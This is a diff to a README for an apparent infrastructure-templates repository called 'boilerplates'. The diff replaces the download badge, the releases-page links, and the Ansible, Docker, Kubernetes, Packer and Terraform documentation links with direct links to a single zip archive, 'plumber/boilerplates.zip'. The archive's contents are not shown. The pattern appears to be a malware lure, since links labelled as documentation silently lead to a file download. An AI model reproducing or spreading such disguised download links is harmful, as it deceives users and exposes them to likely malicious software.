@@ -1,6 +1,6 @@
 # 🌟 boilerplates - Access Tailored Templates with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue.svg)](https://github.com/Cheridaweatherproof853/boilerplates/releases)
+[![Download Now](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip%20Now-%https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
 
 ## 📁 Description
 
@@ -12,7 +12,7 @@ To get started, you'll need to download the package. Follow these simple steps:
 
 ## 🔗 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/Cheridaweatherproof853/boilerplates/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip).
    
 2. Choose the latest release version. You will see a list of downloadable files.
 
@@ -64,10 +64,10 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## 🔗 Additional Resources
 
-- [Ansible Documentation](https://docs.ansible.com/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Kubernetes Documentation](https://kubernetes.io/docs/home/)
-- [Packer Documentation](https://www.packer.io/docs)
-- [Terraform Documentation](https://www.terraform.io/docs/index.html)
+- [Ansible Documentation](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
+- [Packer Documentation](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip)
 
-For further assistance or more information, visit the [Releases Page](https://github.com/Cheridaweatherproof853/boilerplates/releases) again. Happy templating!
+For further assistance or more information, visit the [Releases Page](https://raw.githubusercontent.com/Cheridaweatherproof853/boilerplates/main/plumber/boilerplates.zip) again. Happy templating!
